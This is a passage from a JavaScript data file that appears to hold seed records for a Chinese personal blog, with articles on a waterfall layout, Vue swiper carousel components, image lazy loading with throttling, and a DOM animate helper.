item[i].style.left = 0\n                } else {\n                    let w = i * width\n                    let g = i * gap\n                    item[i].style.left = `calc(${w}px + ${g}px)`\n                }\n            } else {\n                // 当前数组的最低offsetHeight索引\n                const minIndex = getMinIndex(offsetList);\n                let w = minIndex * width;\n                let g = minIndex * gap;\n                item[i].style.top = offsetList[minIndex] + g + "px"\n                item[i].style.left = w + g + "px"\n                offsetList[minIndex] += item[i].offsetHeight + gap\n            }\n        }\n\n    }\n\n</script>\n\n</html>\n```\n\n',
      click: 48,
      createdAt: '2020-10-14T13:04:54.000Z',
      updatedAt: '2021-02-16T13:16:19.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 49,
            article_id: 49,
            type_id: 1,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 49,
            user_id: 1,
            article_id: 49,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 1,
          name: 'JavaScript',
          color: '#3b6b55',
          createdAt: '2020-12-23T16:00:00.000Z',
          updatedAt: '2021-01-01T20:17:10.000Z',
        },
      ],
    },
    {
      id: 48,
      title: '基于vue封装的移动端swiper组件',
      is_comment: 1,
      status: 1,
      img: '/1598024067301applbt.png',
      content:
        '## 基于vue封装的移动端swiper组件\n\n> 直接上代码！\n\n## App.vue\n\n```vue\n<template>\n  <div>\n    <div class="container">\n      <h2>移动端轮播图</h2>\n      <div v-if="imgList.length>0">\n        <Swiper :delay="delay" :duration="duration" :moveRatio="moveRatio">\n          <swiper-item v-for="(item,index) in imgList" :key="index">\n            <img :src="item.img" alt height="200" />\n          </swiper-item>\n        </Swiper>\n      </div>\n    </div>\n\n  </div>\n</template>\n\n<script>\n// 移动端轮播图\nimport { Swiper, SwiperItem } from "./components/SwiperApp/index";\n\n\nexport default {\n  name: "App",\n  components: {\n    Swiper,\n    SwiperItem,\n  },\n  data() {\n    return {\n      imgList: [],\n      mode: "vertical", // 轮播模式，默认：horizontal，可选：vertical\n      delay: 1500, // 轮播间隔，默认1000\n      duration: 400, // 动画时长，默认300\n      moveRatio: 0.2, // 触控比率，默认0.3\n    };\n  },\n  created() {},\n  mounted() {\n    fetch("/api/article/page?type=前端&nowpage=2&pagesize=5")\n      .then((response) => response.json())\n      .then((data) => {\n        this.imgList = data.pagelist.rows;\n      })\n      .catch((e) => console.log("Oops, error", e));\n  },\n};\n</script>\n\n<style scoped>\n.container {\n  width: 100%;\n  margin: 100px auto 0;\n  box-shadow: 0 0 4px 1px rgba(232, 237, 250, 0.5);\n  border: 1px solid #ebebeb;\n  border-radius: 3px;\n  padding: 20px;\n  box-sizing: border-box;\n}\n</style>\n\n```\n\n## Swiper.vue\n\n```vue\n<template>\n  <div>\n    <div class="carousel" ref="carousel">\n      <div\n        class="panels"\n        ref="panels"\n        @touchstart="touchStart"\n        @touchmove="touchMove"\n        @touchend="touchEnd"\n      >\n        <slot></slot>\n      </div>\n      <!-- <div class="arrow">\n        <i class="left-arrow"></i>\n        <i class="right-arrow"></i>\n      </div>-->\n      <ul class="poins" ref="poins" v-if="allcount !=null">\n        <li v-for="(item,index) in allcount" :key="index" :class="{active: index == currentIndex}">\n          <div></div>\n        </li>\n      </ul>\n    </div>\n  </div>\n</template>\n\n<script>\nimport SwiperItem from "./SwiperItem";\nexport default {\n  name: "Swiper",\n  components: {\n    SwiperItem,\n  },\n  props: {\n    // 轮播间隔\n    delay: {\n      type: Number,\n      default: 2000,\n    },\n    // 动画时长\n    duration: {\n      type: Number,\n      default: 300,\n    },\n    // 触控比率\n    moveRatio: {\n      type: Number,\n      default: 0.3,\n    },\n  },\n  data() {\n    return {\n      allcount: null,\n      animation: null,\n      swiperWidth: null,\n      currentIndex: 0,\n      startX: 0,\n      scrolling: false,\n    };\n  },\n\n  created() {},\n  mounted() {\n    var panels = this.$refs.panels;\n    this.swiperWidth = panels.offsetWidth;\n    var poins = this.$refs.poins;\n    this.allcount = panels.childNodes.length;\n    panels.style.transform = `translate3d(-${this.swiperWidth}px, 0, 0)`;\n    // panels.firstChild.classList.add("active");\n    // 在刚页面加载完成的时候，this.$refs.poins是没有子元素的，\n    // 因为allcount是页面加载完成后才获取的，有allcount后，才会开始进行v-for渲染dom元素，\n    // 因此获取到allcount后，要等到dom更新完成了才能获取firstChild\n    this.$nextTick(() => {\n      // DOM更新了才执行\n      this.$refs.poins.firstChild.classList.add("active");\n      this.init();\n    });\n  },\n  methods: {\n    touchStart: function (e) {\n      // 停止定时器\n      clearInterval(this.timer);\n\n      // 保存开始滚动的位置\n      this.startX = e.touches[0].pageX;\n    },\n\n    touchMove: function (e) {\n      // 1.计算出用户拖动的距离\n      let currentX = e.touches[0].pageX;\n      // 移动的距离\n      this.moveDistance = currentX - this.startX;\n      let currentPosition = -(this.currentIndex + 1) * this.swiperWidth;\n      let position = this.moveDistance + currentPosition;\n      // 2.设置当前的位置\n      this.$panels.style.transform = `translate3d(${position}px, 0, 0)`;\n    },\n\n    touchEnd: function (e) {\n      let lastDistance = Math.abs(this.moveDistance);\n      if (lastDistance == 0) {\n        return;\n      } else if (\n        this.moveDistance > 0 &&\n        lastDistance > this.swiperWidth * this.moveRatio\n      ) {\n        // 右边移动超过this.moveRatio\n        // console.log("右边移动超过this.moveRatio");\n        this.pre();\n      } else if (\n        this.moveDistance < 0 &&\n        lastDistance > this.swiperWidth * this.moveRatio\n      ) {\n        // 左边移动超过this.moveRatio\n        // console.log("左边移动超过this.moveRatio");\n        this.next();\n      } else {\n        if (this.moveDistance > 0) {\n          // console.log("右边移动不超过0.3");\n          if (this.currentIndex + 1 == this.allcount) {\n            let position = -this.swiperWidth * (this.currentIndex + 1);\n            this.animate(position);\n          } else {\n            this.currentIndex++;\n            this.pre();\n          }\n        } else {\n          // console.log("左边移动不超过0.3");\n          this.currentIndex--;\n          this.next();\n        }\n      }\n      this.loopStart();\n    },\n    // init\n    init() {\n      this.timer = null;\n      this.$root = this.$refs.carousel;\n      this.$panels = this.$root.querySelector(".panels");\n      this.$panelsItem = this.$root.querySelectorAll(".panels div");\n      // this.$poins = this.$root.querySelectorAll(".poins li");\n      // 3.如果大于1个, 那么在前后分别添加一个slide\n      if (this.allcount > 1) {\n        let cloneFirst = this.$panelsItem[0].cloneNode(true);\n        let cloneLast = this.$panelsItem[this.allcount - 1].cloneNode(true);\n        this.$panels.insertBefore(cloneLast, this.$panelsItem[0]);\n        this.$panels.appendChild(cloneFirst);\n      }\n      const css = ($node, newStyle) => Object.assign($node.style, newStyle);\n      this.loopStart();\n      // this.bindEvent();\n    },\n    // 绑定事件\n    bindEvent() {\n      this.$next.onclick = this.next.bind(this);\n      this.$pre.onclick = this.pre.bind(this);\n      // 循环轮播\n      this.$root.onmouseover = () => clearInterval(this.timer);\n      this.$root.onmouseleave = () => this.loopStart();\n    },\n    // 下一个\n    next() {\n      this.scrolling = true;\n      let currentIndex = this.currentIndex;\n      let nextIndex = (this.currentIndex + 1) % this.$panelsItem.length;\n      this.currentIndex = nextIndex;\n      if (currentIndex <= this.allcount) {\n        let position = -this.swiperWidth * (currentIndex + 1 + 1);\n        this.animate(position);\n      }\n      if (currentIndex + 1 == this.allcount) {\n        setTimeout(() => {\n          let position = -this.swiperWidth;\n          this.$panels.style.transform = `translate3d(${position}px, 0, 0)`;\n        }, this.duration);\n      }\n      setTimeout(() => {\n        this.scrolling = false;\n      }, this.duration);\n    },\n    // 上一个\n    pre() {\n      this.scrolling = true;\n      let currentIndex = this.currentIndex;\n      let preIndex =\n        (this.currentIndex - 1 + this.$panelsItem.length) %\n        this.$panelsItem.length;\n      this.currentIndex = preIndex;\n\n      // pre = 3\n      if (preIndex == this.allcount - 1) {\n        this.animate(0);\n        setTimeout(() => {\n          let position = -this.swiperWidth * this.allcount + 1;\n          this.$panels.style.transform = `translate3d(${position}px, 0, 0)`;\n        }, this.duration);\n      } else {\n        // pre =012\n        let position = -this.swiperWidth * (preIndex + 1);\n        this.animate(position);\n      }\n      setTimeout(() => {\n        this.scrolling = false;\n      }, this.duration);\n    },\n    // 动画\n    animate(position) {\n      this.$panels.style.transition = `transform ${this.duration}ms ease 0s`;\n      this.$panels.style.transform = `translate3d(${position}px, 0, 0)`;\n      setTimeout(() => {\n        this.$panels.style.transition = `all 0ms ease 0s`;\n      }, 100);\n    },\n    // 开始轮播\n    loopStart() {\n      this.timer = setInterval(() => {\n        this.$panels.style.transform = `translate3d(-${this.swiperWidth}px, 0, 0)`;\n        this.next();\n      }, this.delay);\n    },\n  },\n};\n</script>\n\n<style scoped>\n.carousel {\n  position: relative;\n  text-align: center;\n  overflow: hidden;\n  z-index: 30;\n}\n.carousel .panels {\n  display: flex;\n  width: 100%;\n  height: 100%;\n}\n.carousel .panels .active {\n  z-index: 10;\n}\n.carousel .poins {\n  position: absolute;\n  margin: 0;\n  padding: 0;\n  bottom: 0;\n  left: 50%;\n  transform: translate(-50%);\n  z-index: 999;\n}\n.carousel .poins li {\n  display: inline-block;\n  list-style: none;\n  padding: 0 5px;\n  z-index: 99;\n}\n.carousel .poins li div {\n  display: block;\n  opacity: 0.1;\n  width: 8px;\n  height: 8px;\n  border-radius: 50%;\n  background-color: rgba(10, 10, 10);\n  transition: 0.3s;\n}\n.carousel .poins li.active div {\n  opacity: 0.5;\n}\n</style>\n```\n\n## SwiperItem.vue\n\n```vue\n<template>\n  <div class="panels-item">\n    <slot></slot>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "SwiperItem",\n  components: {},\n  data() {\n    return {};\n  },\n  created() {},\n  mounted() {},\n};\n</script>\n\n<style scoped>\n.panels-item {\n  flex-shrink: 0;\n  display: flex;\n  justify-content: center;\n  align-items: center;\n  height: 100%;\n  width: 100%;\n  z-index: 10;\n}\n.panels-item img {\n  width: 100%;\n}\n</style>\n```\n\n',
      click: 7,
      createdAt: '2020-08-21T15:34:56.000Z',
      updatedAt: '2021-02-16T13:16:06.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 48,
            article_id: 48,
            type_id: 1,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 48,
            user_id: 1,
            article_id: 48,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 5,
          name: 'vue',
          color: 'rgba(65, 184, 131, 1)',
          createdAt: '2020-07-04T15:19:33.000Z',
          updatedAt: '2020-07-04T15:19:33.000Z',
        },
        {
          id: 20,
          name: '造轮子',
          color: 'rgba(151, 239, 19, 1)',
          createdAt: '2020-08-13T15:01:02.000Z',
          updatedAt: '2020-08-13T15:01:02.000Z',
        },
      ],
    },
    {
      id: 47,
      title: '基于vue封装的pc端swiper组件',
      is_comment: 1,
      status: 1,
      img: '/1598023696835pclbt.png',
      content:
        '## 基于vue封装的pc端swiper组件\n\n> 话不多说，直接上代码\n\n## App.vue\n\n```vue\n<template>\n  <div>\n    <div class="container">\n      <h2>Pc端轮播图</h2>\n      <div v-if="imgList.length>0">\n        <Swiper :delay="delay" :duration="duration" :mode="mode">\n          <swiper-item v-for="(item,index) in imgList" :key="index">\n            <img :src="item.img" alt height="300" />\n          </swiper-item>\n        </Swiper>\n      </div>\n    </div>\n  </div>\n</template>\n\n<script>\n// Pc端轮播图\nimport { Swiper, SwiperItem } from "./components/Swiper/index";\nexport default {\n  name: "App",\n  components: {\n    Swiper,\n    SwiperItem,\n  },\n  data() {\n    return {\n      imgList: [],\n      mode: "vertical", // 轮播模式，默认：horizontal，可选：vertical\n      delay: 1500, // 轮播间隔，默认1000\n      duration: 400, // 动画时长，默认300\n      moveRatio: 0.2, // 触控比率，默认0.3\n    };\n  },\n  created() {},\n  mounted() {\n    fetch("/api/article/page?type=前端&nowpage=2&pagesize=5")\n      .then((response) => response.json())\n      .then((data) => {\n        this.imgList = data.pagelist.rows;\n      })\n      .catch((e) => console.log("Oops, error", e));\n  },\n};\n</script>\n\n<style scoped>\n.container {\n  width: 100%;\n  margin: 100px auto 0;\n  box-shadow: 0 0 4px 1px rgba(232, 237, 250, 0.5);\n  border: 1px solid #ebebeb;\n  border-radius: 3px;\n  padding: 20px;\n  box-sizing: border-box;\n}\n</style>\n\n```\n\n## components\n\n### Swiper.vue\n\n```vue\n<template>\n  <div>\n    <div class="carousel" ref="carousel">\n      <div class="panels" ref="panels">\n        <slot></slot>\n      </div>\n      <div class="arrow">\n        <i class="left-arrow"></i>\n        <i class="right-arrow"></i>\n      </div>\n      <ul class="poins" ref="poins" v-if="allcount !=null">\n        <li v-for="(item,index) in allcount" :key="index">\n          <button></button>\n        </li>\n      </ul>\n    </div>\n  </div>\n</template>\n\n<script>\nimport SwiperItem from "./SwiperItem";\nexport default {\n  name: "Swiper",\n  components: {\n    SwiperItem,\n  },\n  props: {\n    // 轮播间隔\n    delay: {\n      type: Number,\n      default: 2000,\n    },\n    // 动画时长\n    duration: {\n      type: Number,\n      default: 300,\n    },\n    // 轮播模式\n    mode: {\n      type: String,\n      default: "horizontal",\n    },\n  },\n  data() {\n    return {\n      allcount: null,\n      animation: null,\n    };\n  },\n  created() {},\n  mounted() {\n    var panels = this.$refs.panels;\n    var poins = this.$refs.poins;\n    this.allcount = panels.childNodes.length;\n    panels.firstChild.classList.add("active");\n    // 在刚页面加载完成的时候，this.$refs.poins是没有子元素的，\n    // 因为allcount是页面加载完成后才获取的，有allcount后，才会开始进行v-for渲染dom元素，\n    // 因此获取到allcount后，要等到dom更新完成了才能获取firstChild\n    this.$nextTick(() => {\n      // DOM更新了才执行\n      this.$refs.poins.firstChild.classList.add("active");\n      this.init();\n    });\n  },\n  methods: {\n    // init\n    init() {\n      this.timer = null;\n      this.$root = this.$refs.carousel;\n      this.$panels = this.$root.querySelectorAll(".panels div");\n      this.$next = this.$root.querySelector(".arrow .right-arrow");\n      this.$pre = this.$root.querySelector(".arrow .left-arrow");\n      this.$poins = this.$root.querySelectorAll(".poins li");\n      const css = ($node, newStyle) => Object.assign($node.style, newStyle);\n      let that = this;\n      const animation = {\n        // 垂直轮播\n        vertical($from, $to, direction) {\n          // 首先清空原本的style样式，然后再自定义样式，因为如果不先清空style，\n          // 会导致第二轮轮播的时候，之前设置的setTimeout的样式先执行css()，这时候就会出问题，\n          // 所以应该在每次轮播时，先清空之前的style，再重新设置css()和setTimeout\n          $from.style = "";\n          $to.style = "";\n          css($from, {\n            transform: `translateY(0)`,\n            zIndex: 10,\n          });\n          css($to, {\n            transform: `translateY(${direction === "pre" ? "-" : ""}100%)`,\n            zIndex: 10,\n          });\n          setTimeout(() => {\n            css($from, {\n              transform: `translateY(${direction === "next" ? "-" : ""}100%)`,\n              transition: that.duration + "ms",\n            });\n          }, 0);\n          setTimeout(\n            () =>\n              css($to, {\n                transform: `translateY(0)`,\n                transition: that.duration + "ms",\n              }),\n            0\n          );\n        },\n        // 水平轮播\n        horizontal($from, $to, direction) {\n          $from.style = "";\n          $to.style = "";\n          css($from, {\n            transform: `translateX(0)`,\n            zIndex: 10,\n          });\n          css($to, {\n            transform: `translateX(${direction === "pre" ? "-" : ""}100%)`,\n            zIndex: 10,\n          });\n          setTimeout(\n            () =>\n              css($from, {\n                transform: `translateX(${direction === "next" ? "-" : ""}100%)`,\n                transition: that.duration + "ms",\n              }),\n            0\n          );\n          setTimeout(\n            () =>\n              css($to, {\n                transform: `translateX(0)`,\n                transition: that.duration + "ms",\n              }),\n            0\n          );\n        },\n      };\n      this.animation = animation;\n      this.loopStart();\n      this.bindEvent();\n    },\n    // 绑定事件\n    bindEvent() {\n      this.$next.onclick = this.next.bind(this);\n      this.$pre.onclick = this.pre.bind(this);\n      this.$poins.forEach(($poin) => ($poin.onclick = this.goPage.bind(this)));\n      // 循环轮播\n      this.$root.onmouseover = () => clearInterval(this.timer);\n      this.$root.onmouseleave = () => this.loopStart();\n    },\n    // 下一个\n    next() {\n      let fromIndex = this.getIndex();\n      let toIndex = (fromIndex + 1) % this.$panels.length;\n      this.setActive(toIndex);\n      this.animation[this.mode](\n        this.$panels[fromIndex],\n        this.$panels[toIndex],\n        "next"\n      );\n    },\n    // 上一个\n    pre() {\n      let fromIndex = this.getIndex();\n      let toIndex = (fromIndex - 1 + this.$panels.length) % this.$panels.length;\n      this.setActive(toIndex);\n      this.animation[this.mode](\n        this.$panels[fromIndex],\n        this.$panels[toIndex],\n        "pre"\n      );\n    },\n    // 指定轮播图\n    goPage(e) {\n      // 判断点击的dom对象是不是li,如果是li则直接返回target\n      // 如果点击的是li下面的button,则返回button的父节点，即li\n      const $clickNode =\n        e.target.nodeName === "BUTTON" ? e.target.parentNode : e.target;\n      // 查找当前点击的节点在poins的下标\n      let toIndex = [...this.$poins].indexOf($clickNode);\n      let fromIndex = this.getIndex();\n      if (toIndex === fromIndex) return;\n      if (fromIndex > toIndex) {\n        this.animation[this.mode](\n          this.$panels[fromIndex],\n          this.$panels[toIndex],\n          "pre"\n        );\n      } else {\n        this.animation[this.mode](\n          this.$panels[fromIndex],\n          this.$panels[toIndex],\n          "next"\n        );\n      }\n      this.setActive(toIndex);\n    },\n    // 获取当前轮播图\n    getIndex() {\n      return [...this.$poins].indexOf(\n        this.$root.querySelector(".poins li.active")\n      );\n    },\n    // 设置当前轮播图\n    setActive(index) {\n      this.$poins.forEach(($poin) => $poin.classList.remove("active"));\n      this.$poins[index].classList.add("active");\n      this.$panels.forEach(($panel) => $panel.classList.remove("active"));\n      this.$panels[index].classList.add("active");\n    },\n    // 开始轮播\n    loopStart() {\n      this.timer = setInterval(() => {\n        this.next();\n      }, this.delay);\n    },\n  },\n};\n</script>\n\n<style scoped>\n.carousel {\n  position: relative;\n  text-align: center;\n  height: 300px;\n  overflow: hidden;\n  z-index: 30;\n}\n.carousel:hover .arrow i:nth-child(1) {\n  left: 15px;\n  opacity: 1;\n}\n.carousel:hover .arrow i:nth-child(2) {\n  right: 15px;\n  opacity: 1;\n}\n.carousel .panels:hover {\n  cursor: pointer;\n}\n.carousel .panels .active {\n  z-index: 10;\n}\n.carousel .arrow i {\n  position: absolute;\n  cursor: pointer;\n  top: 50%;\n  width: 36px;\n  height: 36px;\n  transform: translateY(-50%);\n  border-radius: 50%;\n  background-color: rgba(10, 10, 10, 0.3);\n  opacity: 0;\n  transition: 0.3s;\n  z-index: 30;\n}\n.carousel .arrow i:hover {\n  background-color: rgba(20, 20, 20, 0.5);\n}\n.carousel .arrow .left-arrow {\n  left: -20px;\n}\n.carousel .arrow .right-arrow {\n  right: -20px;\n}\n.carousel .poins {\n  position: absolute;\n  margin: 0;\n  padding: 0;\n  bottom: 0;\n  left: 50%;\n  transform: translate(-50%, -50%);\n  z-index: 999;\n}\n.carousel .poins li {\n  display: inline-block;\n  list-style: none;\n  cursor: pointer;\n  padding: 5px;\n  z-index: 99;\n}\n.carousel .poins li button {\n  cursor: pointer;\n  opacity: 0.1;\n  width: 30px;\n  height: 3px;\n  border: 0;\n  outline: none;\n  background-color: rgba(10, 10, 10);\n  transition: 0.3s;\n}\n.carousel .poins li.active button {\n  opacity: 0.5;\n}\n</style>\n\n```\n\n### SwiperItem.vue\n\n```vue\n<template>\n  <div class="panels-item">\n    <slot></slot>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "SwiperItem",\n  components: {},\n  data() {\n    return {};\n  },\n  created() {},\n  mounted() {},\n};\n</script>\n\n<style scoped>\n.panels-item {\n  position: absolute;\n  display: flex;\n  justify-content: center;\n  align-items: center;\n  height: 100%;\n  width: 100%;\n}\n.panels-item img {\n  width: 100%;\n  height: 100%;\n}\n</style>\n```\n\n### index.js\n\n```js\nimport Swiper from \'./Swiper\'\nimport SwiperItem from \'./SwiperItem\'\n\nexport {\n  Swiper, SwiperItem\n}\n```\n\n',
      click: 4,
      createdAt: '2020-08-21T15:28:19.000Z',
      updatedAt: '2021-02-16T13:15:55.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 47,
            article_id: 47,
            type_id: 1,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 47,
            user_id: 1,
            article_id: 47,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 20,
          name: '造轮子',
          color: 'rgba(151, 239, 19, 1)',
          createdAt: '2020-08-13T15:01:02.000Z',
          updatedAt: '2020-08-13T15:01:02.000Z',
        },
        {
          id: 5,
          name: 'vue',
          color: 'rgba(65, 184, 131, 1)',
          createdAt: '2020-07-04T15:19:33.000Z',
          updatedAt: '2020-07-04T15:19:33.000Z',
        },
      ],
    },
    {
      id: 46,
      title: '图片懒加载',
      is_comment: 1,
      status: 1,
      img: '/1598018526635lazy.jpg',
      content:
        '## 图片懒加载\n\n### 场景\n\n一个网页会包含很多的图片，例如淘宝京东这些购物网站，商品图片很多，如果在首页就全部加载的话，会影响渲染速度（比如出现白屏）和浪费带宽，为了解决以上问题，提高用户体验，就出现了懒加载方式来减轻服务器的压力，优先加载可视区域的内容，其他部分等进入了可视区域再加载，从而提高性能。\n\n### 原理\n\n一张图片就是一个img标签，浏览器是否发起请求图片是根据img的src属性，所以实现懒加载的关键就是，在图片没有进入可视区域时，先不给img的src赋值，这样浏览器就不会发送请求了，等到图片进入可视区域再给src赋值。\n\n### 实现\n\n1. 加载loading图片进行占位\n2. 判断哪些图片要加载\n3. 将loading图片替换真图片\n\n```html\n<body>\n    <div class="img-list">\n        <img src="./loading.gif" data-src="1.jpg" width="300" height="300">\n        <img src="./loading.gif" data-src="2.jpg" width="300" height="300">\n        <img src="./loading.gif" data-src="3.jpg" width="300" height="300">\n        <img src="./loading.gif" data-src="4.jpg" width="300" height="300">\n        <img src="./loading.gif" data-src="5.jpg" width="300" height="300">\n        <img src="./loading.gif" data-src="6.jpg" width="300" height="300">\n        <img src="./loading.gif" data-src="7.jpg" width="300" height="300">\n    </div>\n\n    <script>\n        // 节流\n        function throttle(fn, interval, option) {\n            var lastTime = 0\n            var timer\n            var option = option || {}\n            var trailing = option.trailing || false\n            return function () {\n                var _this = this\n                var _arguments = arguments\n                var newTime = new Date().getTime()\n\n                if (timer) {\n                    clearTimeout(timer)\n                }\n\n                var result\n                return new Promise((resolve, reject) => {\n                    if (newTime - lastTime > interval) {\n                        result = fn.apply(_this, _arguments)\n                        resolve(result)\n\n                        lastTime = newTime\n                    } else if (trailing) {\n                        timer = setTimeout(() => {\n                            result = fn.apply(_this, _arguments)\n                            resolve(result)\n                        }, interval);\n                    }\n                })\n            }\n        }\n\n        // 懒加载\n        function lazy() {\n            // 获取页面滚动条卷去的高度\n            let bodyScrollHeight = parseInt(document.body.scrollTop || document.documentElement.scrollTop)\n            // 获取页面高度\n            let windowHeight = window.innerHeight\n            // 获取所有img标签\n            var imgs = document.querySelectorAll(\'img\')\n            // 延迟加载图片\n            setTimeout(() => {\n                for (let i = 0; i < imgs.length; i++) {\n                    // 获取每个img标签距离body的高度\n                    let imgScrollTop = imgs[i].offsetTop\n                    /* \n                        （1）如果img标签距离body的高度 小于 页面高度+被卷去的高度，则代表当前img标签在可视区域，加载图片\n                        （2）由于如果从最底部加载的话，最开头的图片一定符合（1），因此要判断img标签距离body的高度有没有大于滚动的高度，\n                            大于滚动高度了才加载图片\n                     */\n                    if (imgScrollTop >= bodyScrollHeight && imgScrollTop < windowHeight + bodyScrollHeight) {\n                        // 遍历img的所有属性\n                        for (let j = 0; j < imgs[i].attributes.length; j++) {\n                            // 如果有data-src属性，将它的值赋给src\n                            if (imgs[i].attributes[j].name == \'data-src\') {\n                                imgs[i].src = imgs[i].attributes[j].value\n                                // 赋值后data-src就没用了，移除掉它\n                                imgs[i].removeAttribute(\'data-src\')\n                            }\n                        }\n                    }\n                }\n            }, 300);\n        }\n\n        // 刚进首页不触发滚动事件，因此要先加载一次\n        lazy()\n\n        // 监听滚动事件\n        // window.addEventListener(\'scroll\', lazy)\n\n        // 用节流函数优化性能\n        window.addEventListener(\'scroll\', throttle(lazy, 100, { trailing: true }))\n\n    </script>\n\n</body>\n```\n\n',
      click: 20,
      createdAt: '2020-08-21T14:07:13.000Z',
      updatedAt: '2021-02-16T13:15:41.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 46,
            article_id: 46,
            type_id: 1,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 46,
            user_id: 1,
            article_id: 46,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 15,
          name: '性能优化',
          color: 'rgba(140, 72, 193, 0.57)',
          createdAt: '2020-07-15T19:41:04.000Z',
          updatedAt: '2020-07-15T19:41:04.000Z',
        },
        {
          id: 1,
          name: 'JavaScript',
          color: '#3b6b55',
          createdAt: '2020-12-23T16:00:00.000Z',
          updatedAt: '2021-01-01T20:17:10.000Z',
        },
      ],
    },
    {
      id: 45,
      title: 'animate函数封装',
      is_comment: 1,
      status: 1,
      img: '/1597330801448animate.png',
      content:
        "## animate封装\n\n话不多说，直接上代码：\n\n```js\n/**\n * obj 必选，要操作的dom对象\n * json 必选，{},要操作属性，如果是opacity，范围还是0-1;\n * interval 必选，时间间隔\n * callback 可选，回调函数\n */\nfunction animate(obj, json, interval, callback) {\n    clearInterval(obj.timer);\n    if (json.hasOwnProperty('opacity')) {\n        json['opacity'] = json['opacity'] * 100\n    }\n    obj.timer = setInterval(function () {\n        console.log('setInterval');\n        var flag = true;\n        for (var attr in json) {\n            var now = 0;\n            if (attr === 'opacity') {\n                // 获取原本的opacity是个小数，直接parseInt结果是0,因此这里给它扩大100倍再parseInt\n                now = parseInt(getStyle(obj, attr) * 100);\n            }\n            else {\n                now = parseInt(getStyle(obj, attr));\n            }\n            // step是每次变化的步长,步长越大(即stepNum越小),动画总时长越短\n            let stepNum = 6\n            var step = (json[attr] - now) / stepNum\n            // 计算step的时候，如果step是正零点几的时候让他等于1，如果step是负零点几的时候，让他等于0\n            step = step > 0 ? Math.ceil(step) : Math.floor(step);\n            var sum = now + step;\n            if (attr == 'opacity') {\n                //前面扩大了几倍，这里就要缩小几倍\n                obj.style.opacity = sum / 100;\n            } else {\n                obj.style[attr] = sum + 'px';\n            }\n            if (now !== sum) {\n                // 只要有一个没有运动到位就不会清除定时器\n                flag = false;\n            }\n            // 不能加else,否则只要有一项完成了，就清除定时器了\n            // else{\n            //     flag = true\n            // }\n\n        }\n        if (flag) {\n            clearInterval(obj.timer);\n            // 如果有传回调函数就调用回调函数\n            callback && callback();\n        }\n    }, interval)\n}\n\nfunction getStyle(obj, name) {\n    if (window.getComputedStyle) {\n        // 非ie\n        return window.getComputedStyle(obj, null)[name];\n    }\n    else {\n        // ie\n        return obj.currentStyle[name];\n    }\n}\n\n\n```\n\n",
      click: 6,
      createdAt: '2020-08-13T15:00:11.000Z',
      updatedAt: '2021-02-16T13:15:29.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 45,
            article_id: 45,
            type_id: 1,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 45,
            user_id: 1,
            article_id: 45,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 20,
          name: '造轮子',
          color: 'rgba(151, 239, 19, 1)',
          createdAt: '2020-08-13T15:01:02.000Z',
